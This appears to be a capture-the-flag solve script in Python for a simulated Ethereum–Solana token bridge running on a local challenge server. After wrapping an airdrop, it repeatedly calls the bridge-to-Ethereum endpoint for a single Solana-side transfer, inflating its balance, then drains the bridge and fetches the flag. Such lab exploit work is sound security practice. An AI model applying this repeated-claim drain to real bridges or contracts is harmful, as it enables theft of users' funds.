# gen imports
import json
import requests
from time import sleep, time
# eth imports
from web3 import Web3

# solders imports
from solana.rpc.api import Client as Solana
from solders.keypair import Keypair
from solders.pubkey import Pubkey
from solders.transaction import Transaction as SolanaTransaction
from solders.message import Message as SolanaMessage

# spl token imports
import spl.token.instructions as spl_token
from spl.token.constants import TOKEN_PROGRAM_ID
from spl.token.client import Token as SPLToken

"""
unused imports (for now)
from eth_account import Account as EthAccount
from solders.message import Message as SolanaMessage
from spl.token.client import Token as SPLToken
from spl.token.constants import TOKEN_PROGRAM_ID
import spl.token.instructions as spl_token
from web3 import Web3
"""

# base addr
base_addr = "http://192.168.48.1:5000"
# RPC URLs
sol_rpc_url = f"{base_addr}/sol"
eth_rpc_url = f"{base_addr}/eth"
# base ABI path
base_abi_path = "golden-bridge/eth/src/"

# eth functions
def get_airdropped():
	"""*bool airdropped* is in slot 0 so we read it to avoid runtime errors from multiple executions"""
	return w3.eth.get_storage_at(eth_setup_addr, 0)

def get_airdrop():
	"""gets the initial airdrop of 10fth"""
	tx = setup.functions.airdrop().build_transaction({
		'from': eth_player_addr,
		'chainId': w3.eth.chain_id,
		'nonce': nonce,
	})
	signed_tx = w3.eth.account.sign_transaction(tx, private_key=eth_player_key)
	tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
	tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
	return tx_receipt

def get_fth_bal():
	"""gets our fth balance"""
	return feather.functions.balanceOf(eth_player_addr).call()

def get_bbl_bal_eth_player():
	""" gets our bbl balance on the eth side"""
	return bubble.functions.balanceOf(eth_player_addr).call()

def get_bbl_bal_eth_bridge():
	""" gets the bbl balance in the bridge on the eth side """
	return bubble.functions.balanceOf(eth_bridge_addr).call()


def get_bbl_bal_eth_player_bridge():
	"""gets your balance on your account registered in the bridge"""
	bal = bridge.functions.accounts(eth_player_addr).call()
	return bal

def wrap(amount):
	"""wraps FTH turning them into BBL"""
	nonce = w3.eth.get_transaction_count(eth_player_addr)
	fth_bal = get_fth_bal()
	if fth_bal < amount:
		print(f"Tried wrapping {amount}, have {fth_bal} FTH")
		return
	approve_tx = feather.functions.approve(eth_bubble_addr, amount).build_transaction({
		'from': eth_player_addr,
		'chainId': w3.eth.chain_id,
		'gas': 200000,
		'gasPrice': w3.to_wei('50', 'gwei'),
		'nonce': nonce,
		})
	signed_approve_tx = w3.eth.account.sign_transaction(approve_tx, private_key=eth_player_key)
	approve_tx_hash = w3.eth.send_raw_transaction(signed_approve_tx.raw_transaction)
	approve_tx_receipt = w3.eth.wait_for_transaction_receipt(approve_tx_hash)
	nonce += 1
	tx = bubble.functions.wrap(amount).build_transaction({
		'from': eth_player_addr,
		'chainId': w3.eth.chain_id,
		'gas': 200000,
		'gasPrice': w3.to_wei('50', 'gwei'),
		'nonce': nonce,
		})
	signed_tx = w3.eth.account.sign_transaction(tx, private_key=eth_player_key)
	tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
	tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
	print(f"Wrapped {amount} FTH")
	return tx_receipt

def unwrap(amount):
	"""unwraps BBL turning them into FTH"""
	tx = bubble.functions.unwrap(amount).build_transaction({
		'from': eth_player_addr,
		'chainId': w3.eth.chain_id,
		'gas': 200000,
		'gasPrice': w3.to_wei('50', 'gwei'),
		'nonce': nonce,
		})
	signed_tx = w3.eth.account.sign_transaction(tx, private_key=eth_player_key)
	tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
	tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
	return tx_receipt

def deposit_bbl(amount):
	"""deposits $BBL from our account into the bridge"""
	nonce = w3.eth.get_transaction_count(eth_player_addr)
	bbl_bal = get_bbl_bal_eth_player()
	if bbl_bal < amount:
		print(f"Tried depositing {amount}, have {bbl_bal} $BBL")
		return
	tx = bridge.functions.deposit(amount).build_transaction({
		'from': eth_player_addr,
		'chainId': w3.eth.chain_id,
		'gas': 200000,
		'gasPrice': w3.to_wei('50', 'gwei'),
		'nonce': nonce,
		})
	signed_tx = w3.eth.account.sign_transaction(tx, private_key=eth_player_key)
	tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
	receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
	print(f"Deposited {amount} $BBL into the bridge")
	return receipt



def withdraw_bbl(amount):
	nonce = w3.eth.get_transaction_count(eth_player_addr)
	bbl_bal = get_bbl_bal_eth_bridge()
	if bbl_bal < amount:
		print(f"Tried withdrawing {amount}, bridge has {bbl_bal} $BBL")
	tx = bridge.functions.withdraw(amount).build_transaction({
		'from': eth_player_addr,
		'chainId': w3.eth.chain_id,
		'gas': 200000,
		'gasPrice': w3.to_wei('50', 'gwei'),
		'nonce': nonce,
		})
	signed_tx = w3.eth.account.sign_transaction(tx, private_key=eth_player_key)
	tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
	w3.eth.wait_for_transaction_receipt(tx_hash)

	print(f"Withdrawed {amount} $BBL from the bridge")

# solana functions
def create_token_account():
	"""Creates an ATA (Associated Token Account) so we can hold $BBL"""

	ata_addr = spl_token.get_associated_token_address(sol_player_keypair.pubkey(), sol_mint_addr, TOKEN_PROGRAM_ID)

	if solana.get_account_info(ata_addr).value is None:
		print("ATA doesn't exist, creating it")
		recent_blockhash = solana.get_latest_blockhash().value.blockhash
		ix = [
			spl_token.create_associated_token_account(
				payer = sol_player_keypair.pubkey(),
				owner = sol_player_keypair.pubkey(),
				mint = sol_mint_addr,
				token_program_id = TOKEN_PROGRAM_ID,
				)
			]
		solana.send_transaction(
			SolanaTransaction(
				[sol_player_keypair],
				SolanaMessage.new_with_blockhash(ix, sol_player_keypair.pubkey(), recent_blockhash),
				recent_blockhash
				)
			)
		print("Waiting for transaction to complete...")
		sleep(15)
		return ata_addr
	else:
		print(f"ATA already exists: {ata_addr}")
		return ata_addr

def get_bbl_bal_sol_player():
	token = SPLToken(solana, sol_mint_addr, TOKEN_PROGRAM_ID, sol_player_ata_addr)
	bal = token.get_balance(sol_player_ata_addr)
	return bal.value.amount

def get_bbl_bal_sol_bridge():
	ata_addr = spl_token.get_associated_token_address(sol_bridge_pubkey, sol_mint_addr, TOKEN_PROGRAM_ID)
	token = SPLToken(solana, sol_mint_addr, TOKEN_PROGRAM_ID, ata_addr)
	bal = token.get_balance(ata_addr)
	return bal.value.amount

# common functions
def get_current_balance():
	wei_bal = w3.eth.get_balance(eth_player_addr)
	eth_bal = w3.from_wei(wei_bal, 'ether')
	lamports_bal = solana.get_balance(sol_player_keypair.pubkey()).value
	sol_bal = lamports_bal / 1e9
	return eth_bal, sol_bal

def get_all_token_balances():
	print(f'Player ETH account: {get_bbl_bal_eth_player()} $BBL')
	print(f'Player on ETH-Bridge: {get_bbl_bal_eth_player_bridge()} $BBL')
	print(f'Bridge ETH account: {get_bbl_bal_eth_bridge()} $BBL')
	print(f'Player SOL account: {get_bbl_bal_sol_player()} $BBL')
	print(f'Bridge SOL account: {get_bbl_bal_sol_bridge()} $BBL')

# web functions

def bbl_to_sol(amount):
	nonce = w3.eth.get_transaction_count(eth_player_addr)
	approve_tx = bubble.functions.approve(eth_bridge_addr, amount).build_transaction({
		'from': eth_player_addr,
		'chainId': w3.eth.chain_id,
		'gas': 200000,
		'gasPrice': w3.to_wei('50', 'gwei'),
		'nonce': nonce,
		})
	signed_approve_tx = w3.eth.account.sign_transaction(approve_tx, private_key=eth_player_key)
	approve_tx_hash = w3.eth.send_raw_transaction(signed_approve_tx.raw_transaction)
	approve_tx_receipt = w3.eth.wait_for_transaction_receipt(approve_tx_hash)
	nonce += 1
	data = {
		"key": eth_player_key,
		"amount": amount,
		"target": str(sol_player_pubkey)
	}
	res = requests.post(f"{base_addr}/toSol", json=data)
	print(res.text)

def bbl_to_eth(amount):
	data = {
			"key": sol_player_keypair.to_json(),
			"amount": amount,
			"target": eth_player_addr,
		}
	res = requests.post(f"{base_addr}/toEth", json=data)
	print(res.text)

def get_flag():
	print(requests.get(f"{base_addr}/flag").text)
if __name__ == "__main__":

	solana = Solana(sol_rpc_url)
	w3 = Web3(Web3.HTTPProvider(eth_rpc_url))
	assert solana.is_connected()
	assert w3.is_connected()
	print("Connected to SOL and ETH networks")

	# fetches all player info except for rpc url since we already have it
	try:
		res = requests.get(base_addr + "/player.json")
		if res.status_code == 200:
			print("Fetched player info successfully")
			player_info = res.json()
			sol_bridge_pubkey = Pubkey.from_string(player_info["solana"]["bridge"])
			sol_player_pubkey = Pubkey.from_string(player_info["solana"]["pubkey"])
			sol_mint_addr = Pubkey.from_string(player_info["solana"]["mint"])
			sol_player_keypair = Keypair.from_bytes(bytes(player_info["solana"]["keypair"]))

			eth_player_addr = player_info["ethereum"]["address"]
			eth_player_key = player_info["ethereum"]["private_key"]
			eth_setup_addr = player_info["ethereum"]["setup"]

		else:
			print("Wrong base address maybe?")
	except Exception as e:
		print(f"Request failed: {e}")
		exit(1)

	# getting nonce for transactions
	nonce = w3.eth.get_transaction_count(eth_player_addr)
	# open all abis
	with open(f'{base_abi_path}Setup.json', 'r') as abi:
		setup_abi = json.load(abi)

	with open(f'{base_abi_path}Feather.json', 'r') as abi:
		feather_abi = json.load(abi)

	with open(f'{base_abi_path}Bubble.json', 'r') as abi:
		bubble_abi = json.load(abi)

	with open(f'{base_abi_path}Bridge.json', 'r') as abi:
		bridge_abi = json.load(abi)

	# setup contract instance for interaction
	setup = w3.eth.contract(address=eth_setup_addr, abi=setup_abi)

	# getting the addresses of all contracts since it'll be useful
	eth_feather_addr = setup.functions.feather().call()
	eth_bubble_addr = setup.functions.bubble().call()
	eth_bridge_addr = setup.functions.bridge().call()

	# feather bubble and bridge
	feather = w3.eth.contract(address=eth_feather_addr, abi=feather_abi)
	bubble = w3.eth.contract(address=eth_bubble_addr, abi=bubble_abi)
	bridge = w3.eth.contract(address=eth_bridge_addr, abi=bridge_abi)


	# if we try transferring in or out using the web GUI, we don't have an account, so we create one
	sol_player_ata_addr = create_token_account()
	"""after initial solana setup, we have 0 funds so we have to have tokens in our account, 
	so we use 1 time airdrop from Setup.sol
	To get the ABIs I compiled them in remix"""

	eth_bal, sol_bal = get_current_balance()
	print(f'Current balance: {eth_bal} ETH; {sol_bal} SOL.')

	if get_airdropped().hex()[-1:] == '1':
		print("Already got the airdrop, skipping...")
	else:
		get_airdrop()
		nonce += 1
	print(f'Current FTH: {get_fth_bal()}')
	# wraps the airdropped fth into bbl
	wrap(10)

	start_time = time()
	while time() - start_time < 30:
		curr_bal = get_bbl_bal_eth_player()
		print(curr_bal)
		if curr_bal >= 10:
			print("Balance updated!")
			break
		print("Waiting for $BBL balance on player account to update...")
		sleep(2)


	# sends $BBL into bridge so we can start our exploit
	deposit_bbl(10)
	start_time = time()
	while time() - start_time < 30:
		curr_bal = get_bbl_bal_eth_player_bridge()
		if curr_bal == 10:
			print("Balance updated!")
			break
		print("Waiting for $BBL balance on eth-bridge to update...")
		sleep(2)

	get_all_token_balances()

	base_amount = 10
	while get_bbl_bal_eth_player_bridge() <= 1_000_000_000:
		bbl_to_sol(base_amount)
		start_time = time()
		while time() - start_time < 30:
			curr_bal = int(get_bbl_bal_sol_player())
			if curr_bal >= base_amount:
				print(f"Balance updated! {curr_bal} $BBL")
				break
			print(f"Waiting for $BBL balance on SOL account to update...")
			sleep(2)

		for _ in range(11):
			bbl_to_eth(base_amount)
		base_amount *= 10
		print(f"Player Account in Bridge: {get_bbl_bal_eth_player_bridge()} $BBL")
		print(f"Player Account in SOL: {get_bbl_bal_sol_player()} $BBL")

	get_all_token_balances()

	# get all bbl from bridge
	withdraw_bbl(get_bbl_bal_eth_bridge())

	# get the flag
	get_flag()